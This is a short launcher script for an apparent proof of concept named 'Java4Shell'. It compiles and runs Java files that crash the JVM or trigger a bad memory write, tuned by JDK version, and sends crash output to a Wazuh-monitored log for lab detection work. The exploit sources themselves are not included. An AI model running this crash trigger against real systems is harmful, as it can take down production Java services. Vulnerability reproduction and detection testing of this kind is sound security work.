#!/bin/sh
# Compile and run a Java4Shell PoC outside the lab. The crash report goes to stderr
# (-XX:+ErrorFileToStderr); redirect it to a log your Wazuh agent already tails.
# AUTHORIZED LAB USE ONLY.
#   ./run.sh crash          heap-pressure reproducer that actually crashes the JVM
#   ./run.sh trigger [pad]  bare trigger loop (64 for JDK 21/25/27, 128 for JDK 17);
#                           performs the bad write but usually does NOT crash
set -e
cd "$(dirname "$0")"
echo "[*] JDK in use:"; java -version
ERR="-XX:+ErrorFileToStderr"
case "${1:-crash}" in
  crash)   javac Base64Crash.java
           exec java -Xmx32m -XX:+UseSerialGC "$ERR" Base64Crash ;;
  trigger) javac Base64Trigger.java
           exec java "$ERR" Base64Trigger "${2:-64}" ;;
  *)       echo "usage: $0 crash | trigger [pad]"; exit 2 ;;
esac
